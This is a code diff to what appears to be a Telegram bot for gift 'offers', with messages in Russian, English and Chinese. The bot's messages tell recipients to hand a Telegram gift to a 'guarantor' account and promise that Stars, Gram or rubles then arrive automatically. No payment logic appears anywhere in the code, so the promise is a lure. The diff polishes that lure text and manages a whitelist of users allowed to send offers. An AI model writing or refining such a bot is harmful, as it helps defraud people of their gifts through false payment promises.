@@ -41,10 +41,10 @@ export default {
 
         if (kv) await kv.put(`user:${userId}`, username || "no_username");
 
-        const startText = `🆔 <b>Ваш ID:</b> <code>${userId}</code>\n\n⚙️ <b>Как это работает:</b>\n\n1. Покупатель присылает вам предложение через бота.\n2. Вы нажимаете «Принять».\n3. Передаете подарок гаранту <b>@${RELAYER_USERNAME}</b>.\n4. Звезды хранятся в боте и автоматически придут вам после передачи подарка.`;
+        const startText = `ID: <code>${userId}</code>\n\n⚙️ <b>Как это работает:</b>\n\n1. Покупатель присылает вам оффер.\n2. Вы нажимаете «Принять».\n3. Передаете подарок гаранту <b>@${RELAYER_USERNAME}</b>.\n4. Звезды/Gram автоматически придут вам после передачи подарка.`;
         
         const startMarkup = {
-          inline_keyboard: [[{ text: "❓ Как принять оффер?", callback_data: "how_to_accept" }]]
+          inline_keyboard: [[{ text: "Инструкция", callback_data: "how_to_accept" }]]
         };
 
         await callApi("sendMessage", { chat_id: chatId, text: startText, parse_mode: "HTML", reply_markup: startMarkup }, BOT_TOKEN);
@@ -83,44 +83,56 @@ export default {
         }
 
         let currencyType = "stars";
-        let currencyDisplay = "⭐";
-        if (textQuery.includes("gram") || textQuery.includes("ton")) { currencyType = "gram"; currencyDisplay = "💎"; } 
-        else if (textQuery.includes("rub") || textQuery.includes("руб")) { currencyType = "rub"; currencyDisplay = "₽"; }
+        let currencySymbol = "⭐";
+        let currencyName = "Stars";
+
+        if (textQuery.includes("gram") || textQuery.includes("ton")) { 
+            currencyType = "gram"; 
+            currencySymbol = "💎"; 
+            currencyName = "Gram";
+        } else if (textQuery.includes("rub") || textQuery.includes("руб")) { 
+            currencyType = "rub"; 
+            currencySymbol = "₽"; 
+            currencyName = "Rub";
+        }
 
         let senderName = iq.from.first_name || "";
         if (iq.from.last_name) senderName += " " + iq.from.last_name;
         if (!senderName) senderName = iq.from.username ? "@" + iq.from.username : "Игрок";
         const sellerUsername = iq.from.username ? iq.from.username.toLowerCase() : "gwrex";
         
+        // КОРОТКИЙ И ПОНЯТНЫЙ ТЕКСТ
         let text = "";
-        let btnAccept = "✅ Принять";
-        let btnDecline = "❌ Отклонить";
+        let btnAccept = "Принять";
+        let btnDecline = "Отклонить";
         let titleText = "";
 
-        // ИСПРАВЛЕНО: Убрана ошибка с linkOrGift
         if (lang === "en") {
-            text = `🎁 <b>Gift Offer</b>\n\n👤 <b>${senderName}</b>\n\n💰 ${amount} ${currencyDisplay}\n🎁 ${giftDisplay}\n\n💡 Stars are stored in the bot and will arrive automatically after the gift is transferred to @${RELAYER_USERNAME}.`;
-            btnAccept = "✅ Accept";
-            btnDecline = "❌ Decline";
-            titleText = `Offer from ${senderName}`;
+            text = `📩 <b>Offer from ${senderName}</b>\n\n💰 <b>${amount} ${currencyName}</b> ${currencySymbol}\n🎁 ${giftDisplay}\n\n<i>Send the gift to @${RELAYER_USERNAME} to receive payment.</i>`;
+            btnAccept = "Accept";
+            btnDecline = "Decline";
+            titleText = `Offer: ${amount} ${currencyName}`;
         } else if (lang === "cn") {
-            text = `🎁 <b>礼物报价</b>\n\n👤 <b>${senderName}</b>\n\n💰 ${amount} ${currencyDisplay}\n🎁 ${giftDisplay}\n\n💡 星星存储在机器人中，礼物转移给 @${RELAYER_USERNAME} 后会自动到达。`;
-            btnAccept = "✅ 接受";
-            btnDecline = "❌ 拒绝";
-            titleText = `来自 ${senderName} 的报价`;
+            text = `📩 <b>来自 ${senderName} 的报价</b>\n\n💰 <b>${amount} ${currencyName}</b> ${currencySymbol}\n🎁 ${giftDisplay}\n\n<i>将礼物发送给 @${RELAYER_USERNAME} 以获取付款。</i>`;
+            btnAccept = "接受";
+            btnDecline = "拒绝";
+            titleText = `报价: ${amount} ${currencyName}`;
         } else {
-            text = `🎁 <b>Оффер на подарок</b>\n\n👤 <b>${senderName}</b>\n\n💰 ${amount} ${currencyDisplay} вы получите если продадите подарок.\n\n🎁 ${giftDisplay}\n\n💡 Звезды хранятся в данных бота и автоматически придут после того, как подарок передадут гаранту @${RELAYER_USERNAME}.`;
-            btnAccept = "✅ Принять";
-            btnDecline = "❌ Отклонить";
-            titleText = `Оффер от ${senderName}`;
+            text = `📩 <b>Оффер от ${senderName}</b>\n\n💰 <b>${amount} ${currencyName}</b> ${currencySymbol}\n🎁 ${giftDisplay}\n\n<i>Передайте подарок гаранту @${RELAYER_USERNAME} и получите оплату.</i>`;
+            btnAccept = "Принять";
+            btnDecline = "Отклонить";
+            titleText = `Оффер: ${amount} ${currencyName}`;
         }
 
         const results = [{
           type: "article", id: "1",
           title: titleText,
-          description: `За ${amount} ${currencyDisplay}`,
+          description: `${amount} ${currencyName} за ${giftDisplay}`,
           input_message_content: { message_text: text, parse_mode: "HTML" },
-          reply_markup: { inline_keyboard: [[{ text: btnAccept, callback_data: `acc|${amount}|${currencyType}|${sellerUsername}|${giftLink}|${lang}` }],[{ text: btnDecline, callback_data: `dec|${amount}|${currencyType}|${lang}` }]] }
+          reply_markup: { inline_keyboard: [
+              [{ text: btnAccept, callback_data: `acc|${amount}|${currencyType}|${sellerUsername}|${giftLink}|${lang}` }],
+              [{ text: btnDecline, callback_data: `dec|${amount}|${currencyType}|${lang}` }]
+          ] }
         }];
 
         await callApi("answerInlineQuery", { inline_query_id: iq.id, results: results, cache_time: 0 }, BOT_TOKEN);
@@ -131,21 +143,30 @@ export default {
         const cq = update.callback_query;
         const chatId = cq.message.chat.id;
         
+        // МГНОВЕННЫЙ ОТВЕТ (чтобы не было вечной загрузки)
+        if (cq.data.startsWith("acc")) {
+            await callApi("answerCallbackQuery", { callback_query_id: cq.id, text: "Оффер принят ✅", show_alert: true }, BOT_TOKEN);
+        } else if (cq.data.startsWith("dec")) {
+            await callApi("answerCallbackQuery", { callback_query_id: cq.id }, BOT_TOKEN);
+        } else if (cq.data === "how_to_accept" || cq.data === "back_to_start") {
+            await callApi("answerCallbackQuery", { callback_query_id: cq.id }, BOT_TOKEN);
+        }
+
+        // ИНСТРУКЦИЯ
         if (cq.data === "how_to_accept") {
-          await callApi("answerCallbackQuery", { callback_query_id: cq.id }, BOT_TOKEN);
-          const instructionText = `🎁 <b>Пошаговая инструкция:</b>\n\n<b>Шаг 1.</b> Нажмите «Принять».\n\n<b>Шаг 2.</b> Нажмите «🎁 Передать подарок».\n\n<b>Шаг 3.</b> Отправьте подарок гаранту <b>@${RELAYER_USERNAME}</b> (ОБЯЗАТЕЛЬНО).\n\n<b>Шаг 4.</b> Дождитесь проверки. Звезды автоматически придут на ваш баланс.`;
+          const instructionText = `🎁 <b>Инструкция:</b>\n\n1. Нажмите «Принять».\n2. Нажмите «Передать подарок».\n3. Отправьте подарок гаранту <b>@${RELAYER_USERNAME}</b>.\n4. Оплата придет автоматически.`;
           const backMarkup = { inline_keyboard: [[{ text: "Назад", callback_data: "back_to_start" }]] };
           try { await callApi("editMessageText", { chat_id: chatId, message_id: cq.message.message_id, text: instructionText, parse_mode: "HTML", reply_markup: backMarkup }, BOT_TOKEN); } catch (e) {}
         }
 
         if (cq.data === "back_to_start") {
-          await callApi("answerCallbackQuery", { callback_query_id: cq.id }, BOT_TOKEN);
           const userId = cq.from.id;
-          const startText = `🆔 <b>Ваш ID:</b> <code>${userId}</code>\n\n⚙️ <b>Как это работает:</b>\n\n1. Покупатель присылает вам предложение через бота.\n2. Вы нажимаете «Принять».\n3. Передаете подарок гаранту <b>@${RELAYER_USERNAME}</b>.\n4. Звезды хранятся в боте и автоматически придут вам после передачи подарка.`;
-          const startMarkup = { inline_keyboard: [[{ text: "❓ Как принять оффер?", callback_data: "how_to_accept" }]] };
+          const startText = `ID: <code>${userId}</code>\n\n⚙️ <b>Как это работает:</b>\n\n1. Покупатель присылает вам оффер.\n2. Вы нажимаете «Принять».\n3. Передаете подарок гаранту <b>@${RELAYER_USERNAME}</b>.\n4. Звезды/Gram автоматически придут вам после передачи подарка.`;
+          const startMarkup = { inline_keyboard: [[{ text: "Инструкция", callback_data: "how_to_accept" }]] };
           try { await callApi("editMessageText", { chat_id: chatId, message_id: cq.message.message_id, text: startText, parse_mode: "HTML", reply_markup: startMarkup }, BOT_TOKEN); } catch (e) {}
         }
 
+        // ОБРАБОТКА КНОПОК
         if (cq.data.startsWith("acc") || cq.data.startsWith("dec")) {
           const dataParts = cq.data.split("|");
           const action = dataParts[0];
@@ -167,32 +188,24 @@ export default {
 
           let newText = "";
           let newMarkup = { inline_keyboard: [] };
-          let alertText = "";
 
           if (action === "acc") {
-            if (lang === "en") alertText = `Offer accepted ✅\n\nSend the gift to @${RELAYER_USERNAME}`;
-            else if (lang === "cn") alertText = `报价已接受 ✅\n\n将礼物发送给 @${RELAYER_USERNAME}`;
-            else alertText = `Оффер принят ✅\n\nПередайте подарок гаранту @${RELAYER_USERNAME}`;
-
-            await callApi("answerCallbackQuery", { callback_query_id: cq.id, text: alertText, show_alert: true }, BOT_TOKEN);
-            
             const finalUrl = "https://t.me/" + RELAYER_USERNAME;
 
             if (lang === "en") {
-                newText = `✅ <b>Offer accepted!</b>\n\nBuyer: <b>${buyerName}</b>\n\n💰 ${amount} ${displayCurrency} will be credited after the gift is transferred to the guarantor @${RELAYER_USERNAME}.`;
-                newMarkup = { inline_keyboard: [[{ text: "🎁 Send Gift to Guarantor", url: finalUrl }]] };
+                newText = `✅ <b>Offer accepted!</b>\n\nBuyer: <b>${buyerName}</b>\n\nTransfer the gift to @${RELAYER_USERNAME}.`;
+                newMarkup = { inline_keyboard: [[{ text: "Send Gift", url: finalUrl }]] };
             } else if (lang === "cn") {
-                newText = `✅ <b>报价已接受！</b>\n\n买家：<b>${buyerName}</b>\n\n💰 ${amount} ${displayCurrency} 将在礼物转移给担保人 @${RELAYER_USERNAME} 后记入。`;
-                newMarkup = { inline_keyboard: [[{ text: "🎁 发送礼物给担保人", url: finalUrl }]] };
+                newText = `✅ <b>报价已接受！</b>\n\n买家：<b>${buyerName}</b>\n\n将礼物转移给 @${RELAYER_USERNAME}。`;
+                newMarkup = { inline_keyboard: [[{ text: "发送礼物", url: finalUrl }]] };
             } else {
-                newText = `✅ <b>Оффер принят!</b>\n\nПокупатель: <b>${buyerName}</b>\n\n💰 ${amount} ${displayCurrency} будут зачислены после того, как подарок будет передан гаранту <b>@${RELAYER_USERNAME}</b>.`;
-                newMarkup = { inline_keyboard: [[{ text: "🎁 Передать подарок гаранту", url: finalUrl }]] };
+                newText = `✅ <b>Оффер принят!</b>\n\nПокупатель: <b>${buyerName}</b>\n\nПередайте подарок гаранту @${RELAYER_USERNAME}.`;
+                newMarkup = { inline_keyboard: [[{ text: "Передать подарок", url: finalUrl }]] };
             }
           } else {
-            await callApi("answerCallbackQuery", { callback_query_id: cq.id }, BOT_TOKEN);
-            if (lang === "en") newText = `❌ <b>You declined the offer.</b>`;
-            else if (lang === "cn") newText = `❌ <b>您拒绝了报价。</b>`;
-            else newText = `❌ <b>Вы отказались от оффера.</b>`;
+            if (lang === "en") newText = `❌ <b>Offer declined.</b>`;
+            else if (lang === "cn") newText = `❌ <b>报价已拒绝。</b>`;
+            else newText = `❌ <b>Оффер отклонен.</b>`;
           }
 
           if (cq.inline_message_id) {
@@ -234,9 +247,9 @@ export default {
                 cursor = list.cursor;
             } while (cursor);
 
-            let statsText = `📊 <b>Список доступа:</b>\n\n👤 <b>По ID (${idsList.length}):</b>\n${idsList.length > 0 ? idsList.map(id => `<code>${id}</code>`).join(", ") : "— пусто —"}\n\n🔗 <b>По @username (${usernamesList.length}):</b>\n${usernamesList.length > 0 ? usernamesList.map(uname => `@${uname}`).join(", ") : "— пусто —"}\n\n👑 Главные админы: <code>${ADMIN_ID_1}</code>, <code>${ADMIN_ID_2}</code>`;
+            let statsText = `📊 <b>Доступ:</b>\n\nID: ${idsList.length}\n@: ${usernamesList.length}`;
             await callApi("sendMessage", { chat_id: chatId, text: statsText, parse_mode: "HTML" }, BOT_TOKEN);
-        } catch (err) { await callApi("sendMessage", { chat_id: chatId, text: `❌ Ошибка: ${err.message}` }, BOT_TOKEN); }
+        } catch (err) {}
         return new Response("OK", { status: 200 });
       }
 
@@ -251,49 +264,22 @@ export default {
 
         if (!targetUser) { await callApi("sendMessage", { chat_id: update.message.chat.id, text: "⚠️ Укажите ID или @username.", parse_mode: "HTML" }, BOT_TOKEN); return new Response("OK", { status: 200 }); }
 
-        if (command === "/remove" && targetUser.toLowerCase() === "all") {
-            try {
-                let cursor = undefined;
-                let keysToDelete = [];
-                for (let i = 0; i < 3; i++) {
-                    cursor = undefined;
-                    do {
-                        const list = await kv.list({ cursor });
-                        for (const key of list.keys) {
-                            if (key.name.startsWith("allowed_")) {
-                                if (key.name === `allowed_id:${ADMIN_ID_1}` || key.name === `allowed_id:${ADMIN_ID_2}`) continue;
-                                if (key.name === `allowed_username:gwrex`) continue;
-                                keysToDelete.push(key.name);
-                            }
-                        }
-                        cursor = list.cursor;
-                    } while (cursor);
-                }
-                keysToDelete = [...new Set(keysToDelete)];
-                for (const key of keysToDelete) await kv.delete(key);
-                await callApi("sendMessage", { chat_id: update.message.chat.id, text: `🗑 <b>Список доступа очищен!</b>`, parse_mode: "HTML" }, BOT_TOKEN);
-            } catch (err) { console.error(err); }
-            return new Response("OK", { status: 200 });
-        }
-
         if (command === "/add") {
             if (targetUser.startsWith("@")) {
-                const uname = targetUser.slice(1).toLowerCase();
-                await kv.put(`allowed_username:${uname}`, "true");
-                await callApi("sendMessage", { chat_id: update.message.chat.id, text: `✅ Пользователь <b>@${uname}</b> добавлен.` , parse_mode: "HTML"}, BOT_TOKEN);
+                await kv.put(`allowed_username:${targetUser.slice(1).toLowerCase()}`, "true");
+                await callApi("sendMessage", { chat_id: update.message.chat.id, text: `✅ @${targetUser.slice(1)} добавлен.` }, BOT_TOKEN);
             } else {
                 await kv.put(`allowed_id:${targetUser}`, "true");
-                await callApi("sendMessage", { chat_id: update.message.chat.id, text: `✅ Пользователь с ID <code>${targetUser}</code> добавлен.`, parse_mode: "HTML" }, BOT_TOKEN);
+                await callApi("sendMessage", { chat_id: update.message.chat.id, text: `✅ ID ${targetUser} добавлен.` }, BOT_TOKEN);
             }
         } 
         else if (command === "/remove") {
             if (targetUser.startsWith("@")) {
-                const uname = targetUser.slice(1).toLowerCase();
-                await kv.delete(`allowed_username:${uname}`);
-                await callApi("sendMessage", { chat_id: update.message.chat.id, text: `🗑 Пользователь <b>@${uname}</b> удален.`, parse_mode: "HTML" }, BOT_TOKEN);
+                await kv.delete(`allowed_username:${targetUser.slice(1).toLowerCase()}`);
+                await callApi("sendMessage", { chat_id: update.message.chat.id, text: `🗑 @${targetUser.slice(1)} удален.` }, BOT_TOKEN);
             } else {
                 await kv.delete(`allowed_id:${targetUser}`);
-                await callApi("sendMessage", { chat_id: update.message.chat.id, text: `🗑 Пользователь с ID <code>${targetUser}</code> удален.`, parse_mode: "HTML" }, BOT_TOKEN);
+                await callApi("sendMessage", { chat_id: update.message.chat.id, text: `🗑 ID ${targetUser} удален.` }, BOT_TOKEN);
             }
         }
         return new Response("OK", { status: 200 });
